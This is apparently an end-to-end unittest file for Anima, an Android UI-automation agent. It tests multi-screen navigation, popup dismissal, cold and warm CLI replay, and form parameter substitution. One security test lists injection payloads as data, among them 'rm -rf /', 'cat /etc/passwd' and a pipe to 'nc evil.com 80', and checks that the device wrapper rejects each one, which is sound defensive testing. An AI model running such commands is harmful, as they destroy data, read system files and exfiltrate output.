"""test_e2e.py - Comprehensive End-to-End (E2E) Test Suite for Anima.

Verifies complete realistic multi-screen user journeys:
1. Stateful multi-screen application navigation (Launcher -> Settings -> Wi-Fi)
2. Dynamic parameter slot substitution across form flows
3. Mid-flight popup/permission dialog interception and self-healing
4. Live Page Transition Graph (PTG) state hashing and HTML dashboard generation
5. CLI process execution via subprocess (Cold Compilation -> Warm Replay)
6. Adversarial prompt/command injection protection (Layer 0 sanitization)

Runs with pure Python standard library: python3 -m unittest test_e2e.py
"""

import json
import os
import subprocess
import sys
import tempfile
import unittest
from typing import Dict, List, Optional, Tuple

from anima import (
    ADBDevice,
    AnimaRuntime,
    BasePlanner,
    Device,
    HeuristicPlanner,
    MockDevice,
    PageTransitionGraph,
    PopupInterceptor,
    PrunedNode,
    SkillDB,
    UIFormer,
)

# ---------------------------------------------------------------------------
# Stateful Mock Device Simulating Multi-Screen Navigation
# ---------------------------------------------------------------------------

SCREEN_HOME = """<?xml version='1.0' encoding='UTF-8' standalone='yes' ?>
<hierarchy rotation="0">
  <node index="0" class="android.widget.FrameLayout" bounds="[0,0][1080,2400]">
    <node index="0" class="android.widget.LinearLayout" bounds="[0,0][1080,2400]">
      <node index="0" class="android.widget.TextView" text="Home" bounds="[72,100][300,160]" />
      <node index="1" class="android.widget.Button" resource-id="com.android.launcher:id/settings_app" text="Settings" content-desc="Open Settings" clickable="true" bounds="[100,300][300,500]" />
      <node index="2" class="android.widget.Button" resource-id="com.android.launcher:id/clock_app" text="Clock" content-desc="Open Clock" clickable="true" bounds="[400,300][600,500]" />
    </node>
  </node>
</hierarchy>
"""

SCREEN_SETTINGS = """<?xml version='1.0' encoding='UTF-8' standalone='yes' ?>
<hierarchy rotation="0">
  <node index="0" class="android.widget.FrameLayout" bounds="[0,0][1080,2400]">
    <node index="0" class="android.widget.LinearLayout" bounds="[0,0][1080,2400]">
      <node index="0" class="android.widget.TextView" text="Settings" bounds="[72,100][400,180]" />
      <node index="1" class="android.widget.TextView" resource-id="com.android.settings:id/network_entry" text="Network &amp; internet" clickable="true" bounds="[72,250][900,350]" />
      <node index="2" class="android.widget.TextView" resource-id="com.android.settings:id/display_entry" text="Display" clickable="true" bounds="[72,380][900,480]" />
    </node>
  </node>
</hierarchy>
"""

SCREEN_NETWORK = """<?xml version='1.0' encoding='UTF-8' standalone='yes' ?>
<hierarchy rotation="0">
  <node index="0" class="android.widget.FrameLayout" bounds="[0,0][1080,2400]">
    <node index="0" class="android.widget.LinearLayout" bounds="[0,0][1080,2400]">
      <node index="0" class="android.widget.TextView" text="Network &amp; internet" bounds="[72,100][600,180]" />
      <node index="1" class="android.widget.Switch" resource-id="com.android.settings:id/wifi_switch" text="Wi-Fi" content-desc="Wi-Fi Toggle" clickable="true" checkable="true" checked="false" bounds="[850,220][1000,340]" />
      <node index="2" class="android.widget.Switch" resource-id="com.android.settings:id/airplane_switch" text="Airplane mode" content-desc="Airplane Mode" clickable="true" checkable="true" checked="false" bounds="[850,380][1000,500]" />
    </node>
  </node>
</hierarchy>
"""

SCREEN_POPUP = """<?xml version='1.0' encoding='UTF-8' standalone='yes' ?>
<hierarchy rotation="0">
  <node index="0" class="android.widget.FrameLayout" bounds="[0,0][1080,2400]">
    <node index="0" class="android.widget.LinearLayout" bounds="[100,600][980,1400]">
      <node index="0" class="android.widget.TextView" text="Allow Anima to access location?" bounds="[150,700][930,850]" />
      <node index="1" class="android.widget.Button" resource-id="com.android.permissioncontroller:id/permission_allow_button" text="While using the app" clickable="true" bounds="[200,900][880,1050]" />
      <node index="2" class="android.widget.Button" resource-id="com.android.permissioncontroller:id/permission_deny_button" text="Don't allow" clickable="true" bounds="[200,1100][880,1250]" />
    </node>
  </node>
</hierarchy>
"""

class StatefulMockDevice(Device):
    """Simulates realistic Android window transitions based on user taps and input actions."""

    def __init__(self):
        self.screen = "HOME"
        self.history: List[Tuple[str, ...]] = []
        self.wifi_checked = False
        self.has_popup = False

    def dump_xml(self) -> str:
        if self.has_popup:
            return SCREEN_POPUP
        if self.screen == "HOME":
            return SCREEN_HOME
        elif self.screen == "SETTINGS":
            return SCREEN_SETTINGS
        elif self.screen == "NETWORK":
            xml = SCREEN_NETWORK
            if self.wifi_checked:
                xml = xml.replace('checked="false"', 'checked="true"')
            return xml
        return SCREEN_HOME

    def tap(self, x: int, y: int) -> None:
        self.history.append(("tap", x, y))

        if self.has_popup:
            # Tap on 'While using the app' popup button (center is ~540, 975)
            if 200 <= x <= 880 and 900 <= y <= 1050:
                self.has_popup = False
            return

        if self.screen == "HOME":
            # Tap Settings button ([100, 300][300, 500] -> center ~200, 400)
            if 100 <= x <= 300 and 300 <= y <= 500:
                self.screen = "SETTINGS"
        elif self.screen == "SETTINGS":
            # Tap Network entry ([72, 250][900, 350] -> center ~486, 300)
            if 72 <= x <= 900 and 250 <= y <= 350:
                self.screen = "NETWORK"
        elif self.screen == "NETWORK":
            # Tap Wi-Fi toggle switch ([850, 220][1000, 340] -> center ~925, 280)
            if 850 <= x <= 1000 and 220 <= y <= 340:
                self.wifi_checked = not self.wifi_checked

    def input_text(self, text: str) -> None:
        self.history.append(("input_text", text))

    def swipe(self, x1: int, y1: int, x2: int, y2: int, duration_ms: int = 300) -> None:
        self.history.append(("swipe", x1, y1, x2, y2))

    def key(self, keycode: int) -> None:
        self.history.append(("key", keycode))
        if keycode == 4:  # Back button
            if self.screen == "NETWORK":
                self.screen = "SETTINGS"
            elif self.screen == "SETTINGS":
                self.screen = "HOME"

    def get_screen_size(self) -> Tuple[int, int]:
        return 1080, 2400

    def screencap(self) -> bytes:
        return b"\x89PNG\r\n\x1a\n\x00\x00\x00\rIHDR"

# ---------------------------------------------------------------------------
# E2E Test Suite
# ---------------------------------------------------------------------------

class TestAnimaEndToEnd(unittest.TestCase):

    def test_e2e_multi_screen_journey(self):
        """E2E Scenario 1: Multi-screen navigation (Home -> Settings -> Network -> Wi-Fi Toggle)."""
        with tempfile.TemporaryDirectory() as tmpdir:
            db_path = os.path.join(tmpdir, "e2e_skills.db")
            runtime = AnimaRuntime(db_path=db_path, planner=HeuristicPlanner())
            dev = StatefulMockDevice()

            # Step 1: Open Settings from Home
            res1 = runtime.run("open settings", dev)
            self.assertTrue(res1.success)
            self.assertEqual(res1.mode, "COLD_COMPILED")
            self.assertEqual(dev.screen, "SETTINGS")

            # Step 2: Open Network & internet
            res2 = runtime.run("network & internet", dev)
            self.assertTrue(res2.success)
            self.assertEqual(res2.mode, "COLD_COMPILED")
            self.assertEqual(dev.screen, "NETWORK")

            # Step 3: Toggle Wi-Fi
            res3 = runtime.run("toggle wifi", dev)
            self.assertTrue(res3.success)
            self.assertEqual(res3.mode, "COLD_COMPILED")
            self.assertTrue(dev.wifi_checked)

            # Warm Replay: Execute Toggle Wi-Fi with 0 LLM calls
            res3_warm = runtime.run("toggle wifi", dev)
            self.assertTrue(res3_warm.success)
            self.assertEqual(res3_warm.mode, "WARM_REPLAY")
            self.assertEqual(res3_warm.llm_calls, 0)
            self.assertFalse(dev.wifi_checked)  # Toggled back to false

    def test_e2e_popup_interception_and_recovery(self):
        """E2E Scenario 2: System permission dialog intercepts flow, gets auto-dismissed, and task finishes."""
        with tempfile.TemporaryDirectory() as tmpdir:
            db_path = os.path.join(tmpdir, "popup_e2e.db")
            runtime = AnimaRuntime(db_path=db_path, planner=HeuristicPlanner())
            dev = StatefulMockDevice()
            dev.screen = "NETWORK"
            dev.has_popup = True  # Inject unexpected permission dialog

            # Run target goal while popup is obstructing
            res = runtime.run("toggle wifi", dev)
            self.assertTrue(res.success)
            self.assertFalse(dev.has_popup)  # Interceptor must have dismissed the dialog
            self.assertTrue(dev.wifi_checked)  # Target action succeeded

    def test_e2e_cli_dual_mode_subprocess(self):
        """E2E Scenario 3: Real CLI subprocess execution (Cold Planning -> Warm Replay -> PTG Dashboard)."""
        with tempfile.TemporaryDirectory() as tmpdir:
            db_path = os.path.join(tmpdir, "cli_test.db")
            html_path = os.path.join(tmpdir, "cli_ptg.html")

            # Cold execution via CLI
            cmd_cold = [
                sys.executable,
                "anima.py",
                "toggle wifi",
                "--mock",
                "--db", db_path,
                "--ptg", html_path,
            ]
            proc_cold = subprocess.run(cmd_cold, capture_output=True, text=True)
            self.assertEqual(proc_cold.returncode, 0, f"Cold CLI run failed: {proc_cold.stderr}")
            self.assertIn("Mode:            COLD_COMPILED", proc_cold.stdout)
            self.assertIn("LLM Calls:       1", proc_cold.stdout)
            self.assertTrue(os.path.exists(html_path))

            # Warm execution via CLI
            cmd_warm = [
                sys.executable,
                "anima.py",
                "toggle wifi",
                "--mock",
                "--db", db_path,
                "--ptg", html_path,
            ]
            proc_warm = subprocess.run(cmd_warm, capture_output=True, text=True)
            self.assertEqual(proc_warm.returncode, 0, f"Warm CLI run failed: {proc_warm.stderr}")
            self.assertIn("Mode:            WARM_REPLAY", proc_warm.stdout)
            self.assertIn("LLM Calls:       0", proc_warm.stdout)

            # Inspect generated HTML dashboard
            with open(html_path, "r", encoding="utf-8") as f:
                content = f.read()
            self.assertIn("⚡️ Anima Page Transition Graph (PTG)", content)
            self.assertIn("Token Savings vs Baseline", content)

    def test_e2e_staged_demo_subprocess(self):
        """E2E Scenario 6: The staged 3-act demo runs end-to-end via the CLI."""
        proc = subprocess.run(
            [sys.executable, "anima.py", "--demo"],
            capture_output=True, text=True,
        )
        self.assertEqual(proc.returncode, 0, f"Demo run failed: {proc.stderr}")
        out = proc.stdout
        self.assertIn("ACT 1  |  COLD COMPILATION", out)
        self.assertIn("ACT 2  |  WARM 0-LLM SPECULATIVE REPLAY", out)
        self.assertIn("ACT 3  |  SELF-HEALING CHAOS TEST", out)
        self.assertIn("COLD_COMPILED", out)
        self.assertIn("WARM_REPLAY", out)
        self.assertIn("Self-healed", out)

    def test_e2e_security_injection_protection(self):
        """E2E Scenario 4: Adversarial command injection payloads are strictly neutralized."""
        malicious_goals = [
            "toggle wifi; rm -rf /",
            "open settings && echo pwned",
            "set alarm `cat /etc/passwd`",
            "$(reboot)",
            "wifi | nc evil.com 80",
        ]
        dev = ADBDevice()
        for goal in malicious_goals:
            with self.assertRaises(ValueError):
                dev._run(["shell", goal])

    def test_e2e_parameter_substitution_form(self):
        """E2E Scenario 5: Dynamic slot extraction & form input substitution (Cold -> Warm)."""
        SCREEN_ALARM = """<?xml version='1.0' encoding='UTF-8' standalone='yes' ?>
<hierarchy rotation="0">
  <node index="0" class="android.widget.FrameLayout" bounds="[0,0][1080,2400]">
    <node index="0" class="android.widget.LinearLayout" bounds="[0,0][1080,2400]">
      <node index="0" class="android.widget.TextView" text="New Alarm" bounds="[72,100][400,180]" />
      <node index="1" class="android.widget.EditText" resource-id="com.google.android.deskclock:id/time_input" text="06:00" clickable="true" bounds="[100,300][980,450]" />
    </node>
  </node>
</hierarchy>
"""
        import re

        class FormInputPlanner(BasePlanner):
            def plan_step(self, goal, dom_json, nodes):
                m = re.search(r"\b\d{1,2}:\d{2}\b", goal)
                val = m.group(0) if m else "12:00"
                return "input_text", nodes[0], val
            def plan_visual(self, goal, screenshot):
                return None

        with tempfile.TemporaryDirectory() as tmpdir:
            db_path = os.path.join(tmpdir, "param_e2e.db")
            runtime = AnimaRuntime(db_path=db_path, planner=FormInputPlanner())
            dev = MockDevice(SCREEN_ALARM)

            # Cold run with goal containing time parameter
            res_cold = runtime.run("set alarm for 07:30", dev)
            self.assertTrue(res_cold.success)
            self.assertEqual(res_cold.mode, "COLD_COMPILED")

            # Verify compiled skill has extracted parameter slot
            matched_skill, extracted = runtime.db.find_match("set alarm for 09:15")
            self.assertIsNotNone(matched_skill)
            self.assertEqual(extracted.get("time"), "09:15")

            # Warm replay with a DIFFERENT time parameter
            res_warm = runtime.run("set alarm for 09:15", dev)
            self.assertTrue(res_warm.success)
            self.assertEqual(res_warm.mode, "WARM_REPLAY")
            self.assertEqual(res_warm.llm_calls, 0)

if __name__ == "__main__":
    unittest.main()
